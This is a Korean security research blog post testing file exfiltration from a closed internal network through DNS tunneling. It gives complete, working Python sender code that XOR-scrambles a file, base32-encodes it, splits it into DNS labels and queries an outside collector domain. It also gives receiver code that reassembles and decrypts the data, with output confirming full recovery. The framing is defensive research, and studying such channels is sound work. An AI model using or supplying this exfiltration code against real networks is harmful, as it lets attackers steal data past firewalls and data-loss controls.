---
layout: post
title:  "DNS Tunneling을 통한 정보 유출"
author: "qbeom"
comments: true
tags: [research, network]
---

라온화이트햇 핵심연구팀 최규범



# 개요

인터넷 접속이 안되는 내부망 환경에서, 다양한 보안 솔루션이 설치되었어도,
과연, 정보 유출의 위협으로 부터 안전할까요?

DNS Tunneling 기법을 활용하여 위와 같은 환경에서 정보 유출이 가능한지 테스트해보았습니다.

# DNS Tunneling

DNS 프로토콜을 사용하여 임의 데이터를 송수신하는 기술을 DNS Tunneling이라고 합니다.

실제로 많은 악성코드가 원격 명령지 서버와 통신할 때 DNS Tunneling을 악용하고 있습니다.

![/assets/2020-05-01/dns.png](/assets/2020-05-01/dns.png)

그 이유는 내부망 환경 또는 특정 Outbound 포트만 허용되는 환경에서도, DNS 트래픽 송신이 허용되는 경우가 빈번하기 때문입니다.

![/assets/2020-05-01/dns1.png](/assets/2020-05-01/dns1.png)

공격자가 설치한 임의 DNS 서버의 특정 서브 도메인을 조회합니다.
해당 DNS 패킷에서 서브 도메인 정보('leakeddata')만 구별하여 정보를 획득할 수 있습니다.

# 유출 테스트

DNS Tunneling 구현을 위해서는 DNS 서버 구축이 필요합니다.

- Python을 사용하여 DNS Tunneling 구현

       [https://github.com/ialexryan/Burrow-Server](https://github.com/ialexryan/Burrow-Server)

Python을 사용하여 구축할 수 있는 Github 페이지를 확인하였으나, 여러 추가 작업이 필요합니다.

![/assets/2020-05-01/dns2.png](/assets/2020-05-01/dns2.png)

쉬운 방법을 찾던 중, CTF에서도 활용되는 DNSBin(http://dnsbin.zhack.ca/) 페이지를 발견했습니다.

![/assets/2020-05-01/dns3.png](/assets/2020-05-01/dns3.png)

![/assets/2020-05-01/dns4.png](/assets/2020-05-01/dns4.png)

식별 가능한 특정 서브 도메인이 주어지고, 해당 도메인 앞에 임의 데이터를 붙여서 보내면
서버에서 데이터를 가져옵니다.

도메인 이름 규칙 상 대소문자 구분이 없지만, 해당 사이트에서는 이를 구분하여 보여줍니다.

# 테스트 코드(송신)

아래 내용을 통해 송신 테스트 코드를 작성하였습니다.

- 도메인 이름 규칙 상 허용되는 63개 문자 중, 하이픈(-)을 제외한 62개 문자로 구성
- Raw Data를 보내기 위해서 인코딩이 필요하므로, 간단히 쓸 수 있는 Base32를 사용
(Base62를 사용하고 싶으나, 정수형으로 인자를 받기 때문에 복잡하였습니다.)
- Dnsbin에서 중복 데이터를 표시하지 않으므로, 중복을 피하기 위해 간단한 암호화 필요
- 도메인은 최대 253 글자, 라벨은 63글자로 구성되므로 알맞게  잘라서 송신

```python
import socket
import random
import time
import base64

def rand_bytes(count):
    return bytearray(random.getrandbits(8) for _ in range(count))

f = open("./test.dat", "rb")
data = f.read()
f.close()

size = len(data)
print("Data Size(Org) : ", size)

seed = random.randint(0,100000)
random.seed(seed)

enc = bytearray(data)
rnd = rand_bytes(size)
for i in range(size):
    enc[i] = data[i] ^ rnd[i]

enc = base64.b32encode(enc)
enc = enc.replace(b"=", b"0") # Change pad
size_enc = len(enc)
print("Data Size(Enc) : ", size_enc)

base_domain = '.9b14918384f099f6b54a.d.zhack.ca'
remain = 253 - len(base_domain) # Max Length 253
remain -= int(remain/63) # "."
t_start = time.time()

send_data = "S-%d.O-%d.E-%d" % (seed, size, size_enc) #Send seed, size of data
socket.gethostbyname(send_data + base_domain)

for i in range(0, size_enc, remain):
    enc_part = enc[i:i+remain]
    if len(enc_part) > 63:
        send_data = ""
        for j in range(0, remain, 63):
            if j != 0:
                send_data += "."
            send_data += enc_part[j:j+63].decode('utf-8')
    else:
        send_data = enc_part.decode('utf-8')

    socket.gethostbyname(send_data + base_domain)

t = time.time() - t_start
print("Elapsed Time : ", t, "Secs")
print("Speed(Org) : ", size / t, "B/sec") 
print("Speed(Enc) : ", size_enc / t, "B/sec")
```

```python
Data Size(Org) :  21822
Data Size(Enc) :  34920
Elapsed Time :  37.387837171554565 Secs
Speed(Org) :  583.6657493684237 B/sec
Speed(Enc) :  933.9935829871392 B/sec
>>>
```

21.3KB의 파일을 테스트하였고, 약 0.5KB/s 속도로 전송되었습니다.

결과는 네트워크 환경에 따라 다를 수 있다.

# 테스트 코드(수신)

![/assets/2020-05-01/dns5.png](/assets/2020-05-01/dns5.png)

DNS를 요청하는 과정에서 중복된 값이 전송될 수 있습니다. 

이를 처리해주고 초기에 전송한 Seed를 통해 복호화하는 코드를 작성하였습니다.

```python
import random
import base64

def rand_bytes(count):
    return bytearray(random.getrandbits(8) for _ in range(count))

f = open("./result.dat", "rb")
data = f.read()
f.close()

data = data.split(b"\r\n")
info = data[0].split(b".")

seed, size, size_enc = int(info[0][2:]), int(info[1][2:]), int(info[2][2:])
print("Seed : ", seed)
print("Data Size(Org) : ", size)
print("Data Size(Enc) : ", size_enc)

random.seed(seed)
rnd = rand_bytes(size)

enc = b""
for i in range(1,len(data)):
    if data[i] == data[i-1]:
        continue
    enc += data[i]
enc = enc.replace(b".", b"")
enc = enc.replace(b"0", b"=")
dec = base64.b32decode(enc)

print("Data Size(Enc-Recv) : ", len(enc))
print("Data Size(Dec-Recv) : ", len(dec))

dec = bytearray(dec)
for i in range(size):
    dec[i] ^= rnd[i]

f = open("./test.dat", "rb")
org = f.read()
f.close()
print("Compare Result :", org == dec)
```

```python
Seed :  70953
Data Size(Org) :  21822
Data Size(Enc) :  34920
Data Size(Enc-Recv) :  34920
Data Size(Dec-Recv) :  21822
Compare Result : True
>>>
```

결과 파일(result.dat)은 Dnsbin에서 출력된 텍스트를 저장한 파일입니다.

전송된 데이터가 정상적으로 복호화된 것을 확인할 수 있습니다.

### 참조

- 도메인 이름 규칙([https://www.joinc.co.kr/w/man/12/DNS](https://www.joinc.co.kr/w/man/12/DNS))